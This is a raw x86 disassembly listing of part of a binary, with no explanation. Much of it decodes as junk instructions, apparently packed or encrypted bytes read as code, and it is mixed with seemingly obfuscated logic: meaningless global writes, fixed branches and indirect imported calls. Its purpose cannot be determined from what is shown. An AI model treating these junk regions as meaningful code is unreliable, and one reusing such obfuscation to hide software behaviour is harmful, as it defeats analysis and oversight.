  417b44:	adc    bh,ah
  417b46:	xor    esp,DWORD PTR [eax+0x2]
  417b49:	mov    al,0x49
  417b4b:	fchs   
  417b4d:	mov    esi,0x460836b6
  417b52:	lock fcom QWORD PTR [edx-0x25]
  417b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b57:	fsub   QWORD PTR [esi]
  417b59:	popa   
  417b5a:	arpl   WORD PTR [edi],si
  417b5c:	pop    ebx
  417b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b5e:	add    BYTE PTR [ecx-0x13aebd],0x5e
  417b65:	xchg   ebx,eax
  417b66:	out    dx,eax
  417b67:	xchg   dl,ch
  417b69:	pop    ss
  417b6a:	pop    esi
  417b6b:	jns    0x417b6a
  417b6d:	retf   0xe6ae
  417b70:	imul   esi,DWORD PTR [esi+0x14065a71],0x69
  417b77:	out    0x3c,eax
  417b79:	into   
  417b7a:	daa    
  417b7b:	dec    edx
  417b7c:	out    dx,eax
  417b7d:	mov    dl,0x3e
  417b7f:	repz inc ebp
  417b81:	outs   dx,DWORD PTR ds:[esi]
  417b82:	repnz int 0xd6
  417b85:	not    DWORD PTR [ecx+0x3f]
  417b88:	dec    ecx
  417b89:	push   ebp
  417b8a:	jbe    0x417bc3
  417b8c:	xchg   ebx,eax
  417b8d:	xchg   ebp,eax
  417b8e:	jmp    0xe3a:0x443282db
  417b95:	mov    al,ds:0x6e61c605
  417b9a:	sti    
  417b9b:	adc    edx,DWORD PTR [edx-0x52]
  417b9e:	outs   dx,BYTE PTR ds:[esi]
  417b9f:	test   ebp,ebx
  417ba1:	mov    edx,0x577c1570
  417ba6:	sub    al,0x2e
  417ba8:	jbe    0x417b4d
  417baa:	mov    eax,0x705c41dd
  417baf:	push   esp
  417bb0:	xor    ebp,DWORD PTR [edx-0x80]
  417bb3:	jp     0x417c10
  417bb5:	xchg   ebx,eax
  417bb6:	jp     0x417b6a
  417bb8:	dec    eax
  417bb9:	add    DWORD PTR [eax],esp
  417bbb:	test   bh,ah
  417bbd:	idiv   BYTE PTR [ecx]
  417bbf:	xchg   BYTE PTR [ecx-0x61],bl
  417bc2:	or     DWORD PTR [eax],edi
  417bc4:	ds adc esi,esi
  417bc7:	mov    ah,0xa4
  417bc9:	dec    esi
  417bca:	inc    esp
  417bcb:	adc    ebx,DWORD PTR [ebx]
  417bcd:	(bad)  
  417bce:	push   ebp
  417bcf:	loop   0x417bb8
  417bd1:	xchg   edi,eax
  417bd2:	popa   
  417bd3:	dec    edi
  417bd4:	enter  0xede5,0xc9
  417bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bd9:	jns    0x417c44
  417bdb:	mov    ds:0xdfe40b80,al
  417be0:	sbb    BYTE PTR [edi],0x8a
  417be3:	cs fucomp st(0)
  417be6:	fldenv [esp+ecx*8+0x4055ced3]
  417bed:	ret    
  417bee:	push   edx
  417bef:	rol    DWORD PTR [esi-0x6e2c82dc],0xd5
  417bf6:	call   0x9354bb7d
  417bfb:	addr16 pop ebx
  417bfd:	cmc    
  417bfe:	add    dl,BYTE PTR [edx-0x399562c5]
  417c04:	daa    
  417c05:	adc    edx,esp
  417c07:	sub    ecx,DWORD PTR [esi-0x1b]
  417c0a:	arpl   WORD PTR [eax-0x7ce3d2bb],sp
  417c10:	aam    0xaf
  417c12:	push   ebp
  417c13:	jmp    0x28ee1319
  417c18:	add    al,0xd5
  417c1a:	add    esp,ebx
  417c1c:	out    dx,eax
  417c1d:	into   
  417c1e:	add    bh,BYTE PTR [ebx+ecx*8-0x72]
  417c22:	cwde   
  417c23:	in     eax,0x13
  417c25:	cs retf 
  417c27:	push   ebx
  417c28:	jne    0x417c8b
  417c2a:	addr16 int3 
  417c2c:	ds mov ebx,0x9fea69fb
  417c32:	sub    eax,0x1ac4b30c
  417c37:	bnd jg 0x417c46
  417c3a:	in     al,dx
  417c3b:	cmp    DWORD PTR [edi-0x44],ebp
  417c3e:	cmp    al,0x14
  417c40:	adc    DWORD PTR [edx+0x6244f35a],esp
  417c46:	sub    BYTE PTR [ebx+0x54],ch
  417c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c4a:	mov    dh,0xee
  417c4c:	xor    edx,eax
  417c4e:	pop    ebx
  417c4f:	xor    ch,ah
  417c51:	in     al,dx
  417c52:	push   ecx
  417c53:	enter  0xc4c4,0x39
  417c57:	ja     0x417c70
  417c59:	mov    al,0x20
  417c5b:	sar    BYTE PTR [ebx],cl
  417c5d:	iret   
  417c5e:	rcr    BYTE PTR [edi-0x36],1
  417c61:	mov    DWORD PTR [esp+0x1c],esi
  417c65:	add    DWORD PTR ds:0x428435,0x4dd4
  417c6f:	push   eax
  417c70:	and    DWORD PTR ds:0x42857d,0x2c3a
  417c7a:	call   0x40a112
  417c7f:	and    DWORD PTR ds:0x42843d,0x42847d
  417c89:	push   0x4
  417c8b:	push   0x42258c
  417c90:	push   DWORD PTR [esp+0x14]
  417c94:	call   0x411c08
  417c99:	mov    eax,DWORD PTR [esp+0xc]
  417c9d:	mov    ecx,DWORD PTR [esp+0xc]
  417ca1:	xor    DWORD PTR ds:0x42844d,ecx
  417ca7:	mov    eax,DWORD PTR [eax]
  417ca9:	mov    ecx,DWORD PTR [ecx]
  417cab:	cmp    DWORD PTR ds:0x4284dd,0x0
  417cb2:	mov    DWORD PTR ds:0x428571,0x49de
  417cbc:	mov    ebx,0x75ce
  417cc1:	not    edx
  417cc3:	mov    edx,0x562b
  417cc8:	jmp    0x417d30
  417ccd:	mov    DWORD PTR ds:0x42844d,0x3679
  417cd7:	cmp    DWORD PTR ds:0x4284dd,0x0
  417cde:	jle    0x417d16
  417ce4:	push   0x3f3a
  417ce9:	push   0x4284f5
  417cee:	push   DWORD PTR [ebp-0x20]
  417cf1:	push   DWORD PTR [ebp-0x14]
  417cf4:	call   DWORD PTR ds:0x42e284
  417cfa:	xor    edx,DWORD PTR ds:0x42854d
  417d00:	and    DWORD PTR ds:0x42835d,0x535f
  417d0a:	mov    ebx,DWORD PTR ds:0x42833d
  417d10:	and    DWORD PTR ds:0x42832d,ebx
  417d16:	adc    ebx,ebx
  417d18:	neg    DWORD PTR ds:0x428421
  417d1e:	mov    edx,DWORD PTR ds:0x428495
  417d24:	mov    ebx,DWORD PTR ds:0x428511
  417d2a:	sub    ebx,edx
  417d2c:	imul   edx,DWORD PTR [edx+ebx*1]
  417d30:	shr    eax,0x1e
  417d33:	shl    ecx,0x2
  417d36:	cmp    DWORD PTR ds:0x428335,0x0
  417d3d:	mov    edx,0x88a
  417d42:	mov    DWORD PTR ds:0x4284cd,0x5f12
  417d4c:	mov    DWORD PTR ds:0x428359,0x1abe
  417d56:	jmp    0x417da7
  417d5b:	mov    DWORD PTR ds:0x42844d,edi
  417d61:	cmp    DWORD PTR ds:0x428335,0x0
  417d68:	ja     0x417d87
  417d6e:	push   DWORD PTR [ebp-0x20]
  417d71:	push   0x428351
  417d76:	push   DWORD PTR [ebp-0x18]
  417d79:	call   DWORD PTR ds:0x42e0fc
  417d7f:	sbb    ebx,ebx
  417d81:	or     DWORD PTR ds:0x428465,ecx
  417d87:	mov    DWORD PTR ds:0x4284f1,0x1aca
  417d91:	and    ebx,DWORD PTR ds:0x428569
  417d97:	adc    DWORD PTR ds:0x4284f9,0x890
  417da1:	xor    DWORD PTR ds:0x428365,edi
  417da7:	or     eax,ecx
  417da9:	and    ecx,0x4e3
  417daf:	mov    ecx,DWORD PTR [esp+0xc]
  417db3:	xor    eax,0xa5069bae
  417db8:	and    ebx,ebx
  417dba:	mov    DWORD PTR [ecx],eax
  417dbc:	lea    eax,[esp+0x40]
  417dc0:	sbb    ecx,DWORD PTR ds:0x42832d
  417dc6:	mov    DWORD PTR [esp+0x98],eax
  417dcd:	jmp    0x41802a
  417dd2:	or     eax,0xb0eeb0bf
  417dd7:	scas   al,BYTE PTR es:[edi]
  417dd8:	(bad)  
  417dd9:	and    BYTE PTR [ebx],al
  417ddb:	inc    esp
  417ddc:	lods   al,BYTE PTR ds:[esi]
  417ddd:	jecxz  0x417dc7
  417ddf:	cwde   
  417de0:	sub    al,0xd1
  417de2:	jmp    0x417dca
  417de4:	sar    BYTE PTR [esi-0x41413dcb],0xae
  417deb:	adc    esi,DWORD PTR [eax-0x25]
  417dee:	lea    edi,[ecx+0x193389a5]
  417df4:	fcom   QWORD PTR [edx-0x7d08dee8]
  417dfa:	add    al,0x42
  417dfc:	sub    esi,DWORD PTR [esi-0x30]
  417dff:	mov    edx,DWORD PTR [ebx-0x60af335f]
  417e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e06:	cld    
  417e07:	test   al,0x9f
  417e09:	inc    ecx
  417e0a:	aas    
  417e0b:	enter  0xe793,0xa
  417e0f:	add    bl,ah
  417e11:	sub    ch,BYTE PTR [ebx]
  417e13:	sahf   
  417e14:	cmp    BYTE PTR [edi],cl
  417e16:	pop    ecx
  417e17:	pop    ebp
  417e18:	addr16 std 
  417e1a:	imul   ecx,DWORD PTR [eax+0x62a982c6],0x41
  417e21:	out    dx,eax
  417e22:	pop    esp
  417e23:	xor    DWORD PTR [ebx],edi
  417e25:	push   esi
  417e26:	xchg   esi,eax
  417e27:	pushf  
  417e28:	jae    0x417de3
  417e2a:	aas    
  417e2b:	jb     0x417e74
  417e2d:	bound  edi,QWORD PTR [esi+0x50]
  417e30:	xlat   BYTE PTR ds:[ebx]
  417e31:	test   DWORD PTR [eax],esp
  417e33:	cli    
  417e34:	ins    BYTE PTR es:[edi],dx
  417e35:	push   ecx
  417e36:	pop    es
  417e37:	jmp    0xb1ae:0x36b9e4af
  417e3e:	cmp    eax,0x15b9b75e
  417e43:	bound  edx,QWORD PTR [ecx+0x44]
  417e46:	inc    esp
  417e47:	push   es
  417e48:	retf   
  417e49:	sub    DWORD PTR [ebx+ecx*4],esi
  417e4c:	mov    edi,0xf0f63910
  417e51:	xor    eax,0x9a0aa752
  417e56:	jbe    0x417e78
  417e58:	jle    0x417e5c
  417e5a:	inc    edx
  417e5b:	jb     0x417e53
  417e5d:	or     BYTE PTR [edi+0x40],0x92
  417e61:	dec    ebp
  417e62:	jmp    0x417e49
  417e64:	pop    ss
  417e65:	mov    DWORD PTR [eax-0x4f085464],edi
  417e6b:	mov    ah,0xba
  417e6d:	xchg   ebp,eax
  417e6e:	outs   dx,BYTE PTR ds:[esi]
  417e6f:	inc    esi
  417e70:	scas   al,BYTE PTR es:[edi]
  417e71:	std    
  417e72:	mov    ebp,0xf8ba65fa
  417e77:	dec    edi
  417e78:	mov    ebx,0x448d5296
  417e7d:	pop    ss
  417e7e:	arpl   WORD PTR [ecx-0x3f],si
  417e81:	pop    ds
  417e82:	jbe    0x417ea0
  417e84:	lahf   
  417e85:	fldcw  WORD PTR [esp+eiz*4+0x6d]
  417e89:	test   al,0x67
  417e8b:	xchg   edi,eax
  417e8c:	add    DWORD PTR [edx+0x73f8a8c8],0xffffffc7
  417e93:	test   DWORD PTR [esi],ecx
  417e95:	pop    eax
  417e96:	loope  0x417f0d
  417e98:	xchg   esp,eax
  417e99:	in     al,dx
  417e9a:	jp     0x417ea7
  417e9c:	ins    BYTE PTR es:[edi],dx
  417e9d:	imul   edi,eax,0x42
  417ea0:	add    eax,0x82412a37
  417ea5:	inc    esi
  417ea6:	(bad)  
  417ea7:	clc    
  417ea8:	xor    DWORD PTR ss:[eax+eiz*2],ebp
  417eac:	bound  eax,QWORD PTR [ebp+edi*2+0x48]
  417eb0:	cs enter 0x75df,0xee
  417eb5:	add    eax,0x36d701d4
  417eba:	cmp    BYTE PTR [esi+0x10],0xa6
  417ebe:	cld    
  417ebf:	pop    esi
  417ec0:	test   BYTE PTR [eax+0x32],al
  417ec3:	mov    ch,0x1c
  417ec5:	sbb    eax,0x3a67c064
  417eca:	int3   
  417ecb:	xchg   esi,eax
  417ecc:	loop   0x417ef2
  417ece:	jp     0x417e64
  417ed0:	and    ch,dl
  417ed2:	push   ebp
  417ed3:	xchg   edi,eax
  417ed4:	lds    ecx,FWORD PTR [ebx]
  417ed6:	sub    BYTE PTR [ecx],cl
  417ed8:	mov    esp,0xacd7ef68
  417edd:	mov    ds:0xe5be275d,eax
  417ee2:	push   ecx
  417ee3:	mov    ebx,0x17ae3018
  417ee8:	sar    eax,cl
  417eea:	neg    DWORD PTR [ecx+0xb17eefe]
  417ef0:	out    0x5c,eax
  417ef2:	mov    ebx,0x6c7dd3ef
  417ef7:	push   ds
  417ef8:	faddp  st(6),st
  417efa:	jno    0x417e87
  417efc:	push   0x7d6d16b8
  417f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f02:	cld    
  417f03:	ja     0x417f7c
  417f05:	aas    
  417f06:	or     ch,BYTE PTR [edx+0xdfdc5ee]
  417f0c:	pop    esi
  417f0d:	pop    ecx
  417f0e:	mov    ebx,DWORD PTR [eax]
  417f10:	ret    
  417f11:	pop    eax
  417f12:	scas   eax,DWORD PTR es:[edi]
  417f13:	jecxz  0x417f0a
  417f15:	mov    edx,0xf1c35b7f
  417f1a:	mov    dl,0x5
  417f1c:	mov    ecx,0xb9179e54
  417f21:	stos   BYTE PTR es:[edi],al
  417f22:	lahf   
  417f23:	xor    dh,bh
  417f25:	sahf   
  417f26:	in     eax,dx
  417f27:	sub    BYTE PTR [ecx],ch
  417f29:	push   es
  417f2a:	pop    ecx
  417f2b:	stos   DWORD PTR es:[edi],eax
  417f2c:	xor    DWORD PTR [ebp*1-0xa809db4],edi
  417f33:	pop    edx
  417f34:	icebp  
  417f35:	stos   BYTE PTR es:[edi],al
  417f36:	xchg   BYTE PTR ds:0xabb06162,ah
  417f3c:	mov    eax,0xd902101b
  417f41:	mov    bl,0xfe
  417f43:	pop    ebp
  417f44:	xchg   ebp,eax
  417f45:	pushf  
  417f46:	pusha  
  417f47:	mov    dl,0x5b
  417f49:	xchg   ebx,eax
  417f4a:	add    BYTE PTR [eax+0x65],al
  417f4d:	add    al,0x86
  417f4f:	jp     0x417f3b
  417f51:	push   cs
  417f52:	mov    eax,ds:0x9fdd84da
  417f57:	jle    0x417f93
  417f59:	(bad)  
  417f5a:	arpl   WORD PTR [edx+0x42],si
  417f5d:	or     DWORD PTR [ecx],0x3673f3c1
  417f63:	mov    cl,0x89
  417f65:	ret    
  417f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f67:	push   esp
  417f68:	mov    ch,0x13
  417f6a:	lea    edi,[eax-0x35]
  417f6d:	(bad)  
  417f6e:	jns    0x417f1c
  417f70:	mov    esi,0xf61130b5
  417f75:	ss in  al,dx
  417f77:	arpl   WORD PTR [edi+0x19f1216e],bx
  417f7d:	(bad)  
  417f7e:	cs xchg ebx,edx
  417f81:	(bad)  
  417f82:	sub    al,0xa2
  417f84:	push   edx
  417f85:	out    0x4,al
  417f87:	mov    eax,ds:0xf3914972
  417f8c:	mov    al,0xfe
  417f8e:	leave  
  417f8f:	les    eax,FWORD PTR [edi-0x563a45f3]
  417f95:	pop    esi
  417f96:	mov    cl,0x9f
  417f98:	add    BYTE PTR [edx],al
  417f9a:	or     ch,BYTE PTR [eax+eax*1]
  417f9d:	sbb    eax,0x3e8da831
  417fa2:	stc    
  417fa3:	jmp    0xe6145473
  417fa8:	mov    ah,0xc6
  417faa:	repnz lods al,BYTE PTR ds:[esi]
  417fac:	cli    
  417fad:	call   0x8171c74
  417fb2:	ror    BYTE PTR [eax],1
  417fb4:	cmp    eax,0xa6a3368e
  417fb9:	dec    ecx
  417fba:	mov    cl,0x71
  417fbc:	call   0x3d8bc11
  417fc1:	ret    0xbe3
  417fc4:	mov    esi,0x560a4214
  417fc9:	push   eax
  417fca:	mov    ebp,0xe54df12e
  417fcf:	jmp    0x81cf:0xbbe48567
  417fd6:	mov    ds:0x409ad58d,al
  417fdb:	in     eax,dx
  417fdc:	repnz cmp BYTE PTR [esi-0x339492bc],ch
  417fe3:	mov    ebx,fs
  417fe5:	into   
  417fe6:	imul   edx,DWORD PTR [ebp+0x23],0x67
  417fea:	push   ecx
  417feb:	lock scas eax,DWORD PTR es:[edi]
  417fed:	ss ja  0x417fd9
  417ff0:	mov    ?,edx
  417ff2:	retf   
  417ff3:	test   BYTE PTR [eax+0x24],0x62
  417ff7:	xchg   BYTE PTR [ebx],dh
  417ff9:	xchg   ecx,eax
  417ffa:	lahf   
  417ffb:	icebp  
  417ffc:	test   eax,0x227f36b6
  418001:	xchg   ebp,eax
  418002:	lahf   
  418003:	xchg   ebx,eax
  418004:	outs   dx,DWORD PTR ds:[esi]
  418005:	dec    ecx
  418006:	and    eax,0xea9a63ca
  41800b:	cwde   
  41800c:	mov    dh,0xd9
  41800e:	shl    DWORD PTR [esi],cl
  418010:	sar    BYTE PTR fs:0x39f3fa9f,cl
  418017:	aad    0x4c
  418019:	hlt    
  41801a:	jae    0x417fac
  41801c:	push   ecx
  41801d:	add    DWORD PTR [edx+0x5d37f410],esp
  418023:	jne    0x41805b
  418025:	pop    edi
  418026:	mov    dh,0xea
  418028:	sbb    al,0x6
  41802a:	lea    eax,[esp+0x98]
  418031:	cmp    DWORD PTR ds:0x42845d,0x0
  418038:	mov    DWORD PTR ds:0x428335,0x1551
  418042:	mov    DWORD PTR ds:0x428545,0x780e
  41804c:	mov    DWORD PTR ds:0x428339,0x4b14
  418056:	jmp    0x418149
  41805b:	mov    DWORD PTR ds:0x428341,edx
  418061:	mov    DWORD PTR ds:0x42833d,0x4140
  41806b:	cmp    DWORD PTR ds:0x42845d,0x0
  418072:	je     0x4180ae
  418078:	push   0x4281f1
  41807d:	push   0x428157
  418082:	call   DWORD PTR ds:0x42e288
  418088:	mov    ecx,DWORD PTR ds:0x428495
  41808e:	xor    ebx,ebx
  418090:	or     ebx,DWORD PTR ds:0x42853d
  418096:	sub    ebx,ecx
  418098:	and    ecx,DWORD PTR [ecx+ebx*1]
  41809b:	mov    ecx,DWORD PTR ds:0x428405
  4180a1:	adc    DWORD PTR ds:0x428501,ecx
  4180a7:	inc    edx
  4180a8:	and    DWORD PTR ds:0x42844d,edi
  4180ae:	adc    DWORD PTR ds:0x4284d9,edx
  4180b4:	xor    ebx,ebx
  4180b6:	or     ebx,DWORD PTR ds:0x4283b1
  4180bc:	mov    ebx,DWORD PTR [ebx]
  4180be:	sub    DWORD PTR ds:0x428425,ebx
  4180c4:	xor    DWORD PTR ds:0x4284e9,0x2cb6
  4180ce:	cmp    DWORD PTR ds:0x428465,0x0
  4180d5:	mov    DWORD PTR ds:0x42844d,edx
  4180db:	mov    edx,DWORD PTR ds:0x4284dd
  4180e1:	jmp    0x418149
  4180e6:	mov    DWORD PTR ds:0x42857d,ebx
  4180ec:	cmp    DWORD PTR ds:0x428465,0x0
  4180f3:	jg     0x41811b
  4180f9:	push   0x428411
  4180fe:	push   0x1e32
  418103:	call   DWORD PTR ds:0x42e28c
  418109:	or     DWORD PTR ds:0x428369,ecx
  41810f:	adc    DWORD PTR ds:0x428549,0x3832
  418119:	not    ecx
  41811b:	sub    edx,DWORD PTR ds:0x428475
  418121:	mov    edx,DWORD PTR ds:0x428389
  418127:	mov    ebx,DWORD PTR ds:0x428511
  41812d:	sub    ebx,edx
  41812f:	sub    edx,DWORD PTR [edx+ebx*1]
  418132:	or     ecx,DWORD PTR ds:0x428549
  418138:	mov    ebx,DWORD PTR ds:0x4283b9
  41813e:	mov    ecx,DWORD PTR ds:0x4285b9
  418144:	sub    ecx,ebx
  418146:	or     ebx,DWORD PTR [ebx+ecx*1]
  418149:	mov    DWORD PTR [esp+0x9c],eax
  418150:	and    DWORD PTR ds:0x428451,ebx
  418156:	mov    eax,DWORD PTR [esp+0x40]
  41815a:	sub    DWORD PTR [esp+0x40],eax
  41815e:	mov    edx,DWORD PTR ds:0x42857d
  418164:	sub    DWORD PTR ds:0x42845d,edx
  41816a:	lea    eax,[ebp+0x4]
  41816d:	cmp    DWORD PTR ds:0x428575,0x0
  418174:	mov    DWORD PTR ds:0x4284dd,0x1e13
  41817e:	mov    ecx,0x65ab
  418183:	jmp    0x4181f4
  418188:	mov    ecx,0x6be4
  41818d:	mov    edx,0x487
  418192:	cmp    DWORD PTR ds:0x428575,0x0
  418199:	jge    0x4181bd
  41819f:	push   DWORD PTR [ebp-0x1c]
  4181a2:	push   0x28cd
  4181a7:	call   DWORD PTR ds:0x42e100
  4181ad:	sub    DWORD PTR ds:0x428475,ebx
  4181b3:	add    DWORD PTR ds:0x428579,0x428441
  4181bd:	mov    ebx,DWORD PTR ds:0x428561
  4181c3:	sbb    ebx,DWORD PTR ds:0x428409
  4181c9:	mov    DWORD PTR ds:0x428561,ebx
  4181cf:	mov    edx,DWORD PTR ds:0x4283ad
  4181d5:	mov    ebx,DWORD PTR ds:0x428529
  4181db:	sub    edx,ebx
  4181dd:	add    edx,DWORD PTR [edx+ebx*1]
  4181e0:	mov    ebx,DWORD PTR ds:0x42832d
  4181e6:	and    ebx,DWORD PTR ds:0x428429
  4181ec:	mov    DWORD PTR ds:0x42832d,ebx
  4181f2:	not    edx
  4181f4:	xor    DWORD PTR [esp+0x40],eax
  4181f8:	mov    DWORD PTR [esp+0x30],0x5b3d
  418200:	cmp    DWORD PTR ds:0x42855d,0x0
  418207:	mov    DWORD PTR ds:0x4284e5,0x564a
  418211:	mov    DWORD PTR ds:0x428465,ecx
  418217:	jmp    0x4184c9
  41821c:	mov    eax,0x378f
  418221:	cmp    DWORD PTR ds:0x42855d,0x0
  418228:	ja     0x41824a
  41822e:	push   0x77e8
  418233:	push   0x361b
  418238:	call   DWORD PTR ds:0x42e104
  41823e:	and    ebx,0x2889
  418244:	not    ebx
  418246:	or     edx,ecx
  418248:	sbb    ecx,ecx
  41824a:	xor    ecx,ecx
  41824c:	xor    ecx,DWORD PTR ds:0x428459
  418252:	adc    DWORD PTR ds:0x42856d,ecx
  418258:	xor    DWORD PTR ds:0x428345,0x4309
  418262:	sub    DWORD PTR ds:0x428375,0x3ee2
  41826c:	jmp    0x4184c9
  418271:	inc    esp
  418272:	inc    edx
  418273:	in     al,dx
  418274:	xor    ah,ch
  418276:	mov    eax,0x8987b29c
  41827b:	test   bh,cl
  41827d:	pop    edx
  41827e:	out    dx,eax
  41827f:	lods   al,BYTE PTR ds:[esi]
  418280:	jecxz  0x4182e6
  418282:	jmp    0xbebe:0xc235bec0
  418289:	in     eax,0xae
  41828b:	jb     0x41821f
  41828d:	add    al,0x1e
  41828f:	cmc    
  418290:	inc    edx
  418291:	shl    DWORD PTR [ecx-0x2692a75],cl
  418297:	or     BYTE PTR [edx+0x263afc26],dl
  41829d:	out    dx,eax
  41829e:	cwde   
  41829f:	outs   dx,BYTE PTR ds:[esi]
  4182a0:	or     ecx,edi
  4182a2:	in     al,dx
  4182a3:	lahf   
  4182a4:	into   
  4182a5:	adc    BYTE PTR [eax],bl
  4182a7:	sar    ch,cl
  4182a9:	pop    ss
  4182aa:	xchg   edi,eax
  4182ab:	dec    ebx
  4182ac:	call   0x7f9a:0x7581608d
  4182b3:	outs   dx,BYTE PTR ds:[esi]
  4182b4:	pop    ds
  4182b5:	mov    ecx,0xec124d21
  4182ba:	push   edi
  4182bb:	jecxz  0x41826b
  4182bd:	call   0x423a118a
  4182c2:	enter  0x194,0xf7
  4182c6:	in     al,dx
  4182c7:	sub    al,0x84
  4182c9:	add    dh,BYTE PTR [edi-0x22aa77d3]
  4182cf:	in     eax,0xf2
  4182d1:	dec    edi
  4182d2:	jecxz  0x418259
  4182d4:	dec    ebx
  4182d5:	mov    ah,0x45
  4182d7:	pop    ebx
  4182d8:	add    ecx,ebx
  4182da:	scas   al,BYTE PTR es:[edi]
  4182db:	add    al,0x10
  4182dd:	js     0x418284
  4182df:	cmp    eax,0xf997f0a2
  4182e4:	jne    0x418299
  4182e6:	mov    dh,0x30
  4182e8:	int3   
  4182e9:	add    al,0x85
  4182eb:	test   dl,al
  4182ed:	lea    ebx,[edx-0x44]
  4182f0:	repnz or bl,BYTE PTR [ebx-0x338cd5ee]
  4182f7:	imul   ebx,DWORD PTR ds:0x6067fbb4,0x1b2b1b62
  418301:	loop   0x41829a
  418303:	pop    esi
  418304:	adc    eax,0x6226f2a
  418309:	sbb    al,0xac
  41830b:	xor    cl,ch
  41830d:	adc    al,0xcc
  41830f:	mov    ch,ch
  418311:	test   esi,ecx
  418313:	adc    eax,0x9b98c1bd
  418318:	or     eax,0xf7abc02b
  41831d:	push   ebx
  41831e:	stos   BYTE PTR es:[edi],al
  41831f:	adc    DWORD PTR [esi],eax
  418321:	xchg   ebp,eax
  418322:	adc    eax,edi
  418324:	xor    al,0x1d
  418326:	jmp    0xb418:0x4af9a1bb
  41832d:	pop    esi
  41832e:	inc    ebx
  41832f:	imul   eax,DWORD PTR [ebx],0xd9744548
  418335:	jg     0x41833d
  418337:	lods   eax,DWORD PTR ds:[esi]
  418338:	or     BYTE PTR [edx+0x20],0x3c
  41833c:	dec    ecx
  41833d:	push   ebp
  41833e:	sti    
  41833f:	pop    ebx
  418340:	and    BYTE PTR [edi-0x18],ah
  418343:	push   cs
  418344:	sub    eax,edi
  418346:	cdq    
  418347:	out    0xdb,al
  418349:	mov    ebp,0xea7dd204
  41834e:	and    al,0xd0
  418350:	sub    eax,0x4fb5efbd
  418355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418356:	mov    edx,0x825c7365
  41835b:	fist   WORD PTR [esi+eiz*4]
  41835e:	ds lahf 
  418360:	xchg   edx,eax
  418361:	ror    DWORD PTR [ebp-0x7b139cef],cl
  418367:	das    
  418368:	and    al,dh
  41836a:	adc    al,0xa
  41836c:	scas   al,BYTE PTR es:[edi]
  41836d:	push   ebp
  41836e:	cli    
  41836f:	mov    WORD PTR [ebp-0x44486ff7],gs
  418375:	aad    0xb
  418377:	mov    cl,0x44
  418379:	std    
  41837a:	xor    edx,DWORD PTR [ecx+esi*1+0x20]
  41837e:	stos   BYTE PTR es:[edi],al
  41837f:	mov    ch,0x6a
  418381:	and    edi,DWORD PTR fs:[ebp-0x52]
  418385:	and    cl,BYTE PTR [ebx-0x60]
  418388:	xchg   edx,eax
  418389:	repnz stc 
  41838b:	xchg   DWORD PTR [eax],ebp
  41838d:	call   0xa98a790b
  418392:	pop    ecx
  418393:	mov    cl,0xa2
  418395:	push   ds
  418396:	cmp    BYTE PTR [edx+0x6a7a557a],cl
  41839c:	pop    sp
  41839e:	cs xor bh,0x71
  4183a2:	jg     0x41832b
  4183a4:	cmp    esi,ecx
  4183a6:	or     ecx,DWORD PTR [eax+0x14]
  4183a9:	retf   0x34a2
  4183ac:	adc    edi,esp
  4183ae:	dec    ecx
  4183af:	pop    ebx
  4183b0:	push   esi
  4183b1:	aad    0x11
  4183b3:	inc    esp
  4183b4:	sub    al,0x54
  4183b6:	addr16 mov ecx,0x68ec0d4b
  4183bc:	dec    edi
  4183bd:	cmp    eax,DWORD PTR [edi+0x4598355b]
  4183c3:	repnz add eax,DWORD PTR [eax]
  4183c6:	in     eax,0xfd
  4183c8:	jle    0x4183f5
  4183ca:	addr16 es push esp
  4183cd:	cs js  0x41837b
  4183d0:	fisubr WORD PTR [ecx]
  4183d2:	mov    edi,0x327b1db6
  4183d7:	lock xlat BYTE PTR ds:[ebx]
  4183d9:	cld    
  4183da:	and    eax,DWORD PTR [esi-0x56]
  4183dd:	ror    DWORD PTR [esi-0x70abc975],0x13
  4183e4:	pusha  
  4183e5:	and    eax,0x66dbd355
  4183ea:	inc    edi
  4183eb:	add    ch,cl
  4183ed:	push   ecx
  4183ee:	es js  0x418387
  4183f1:	int    0x2
  4183f3:	dec    esi
  4183f4:	inc    ecx
  4183f5:	xchg   edi,eax
  4183f6:	mov    gs,WORD PTR [edx+ebp*8]
  4183f9:	cwde   
  4183fa:	cmp    bh,BYTE PTR [ecx+eax*4+0x6d]
  4183fe:	push   0x536f034c
  418403:	and    al,BYTE PTR [edx-0x24]
  418406:	aaa    
  418407:	aas    
  418408:	xchg   edx,eax
  418409:	push   ebp
  41840a:	push   eax
  41840b:	or     al,0x5d
  41840d:	mov    WORD PTR [ebp-0x44],gs
  418410:	mov    ebx,0x95272462
  418415:	push   esi
  418416:	sbb    al,0xe8
  418418:	(bad)  
  418419:	sti    
  41841a:	ins    DWORD PTR es:[edi],dx
  41841b:	out    dx,al
  41841c:	ds and ebp,esp
  41841f:	inc    esp
  418420:	add    al,0xa5
  418422:	shr    ch,0x1d
  418425:	pop    esi
  418426:	cmp    esi,ecx
  418428:	jle    0x4183df
  41842a:	aaa    
  41842b:	adc    eax,0x341f996e
  418430:	js     0x41841a
  418432:	popa   
  418433:	std    
  418434:	push   edi
  418435:	xor    BYTE PTR [edx],bh
  418437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418438:	sub    BYTE PTR [edi+0x36],cl
  41843b:	mov    ch,0x3d
  41843d:	fs push ebp
  41843f:	fbstp  TBYTE PTR [esi+0x52]
  418442:	(bad)  
  418444:	mov    edi,0x64e6cd5e
  418449:	sbb    DWORD PTR [edi+0x26cddd2d],esi
  41844f:	int3   
  418450:	loope  0x418481
  418452:	dec    esp
  418453:	or     eax,0x2ac4fde8
  418458:	jmp    0x4184bc
  41845a:	sti    
  41845b:	mov    BYTE PTR [ebx-0x31c4562c],bh
  418461:	lock out dx,al
  418463:	out    0x71,al
  418465:	xchg   BYTE PTR [ecx+esi*4+0x75c4b096],bl
  41846c:	sbb    esi,ebx
  41846e:	dec    edx
  41846f:	mov    bl,0x98
  418471:	dec    edx
  418472:	fld    DWORD PTR [edi+0x2b]
  418475:	movlps QWORD PTR [ebp-0x69],xmm1
  418479:	pop    esp
  41847a:	mov    esp,0x8eac9ec1
  41847f:	shr    eax,0xed
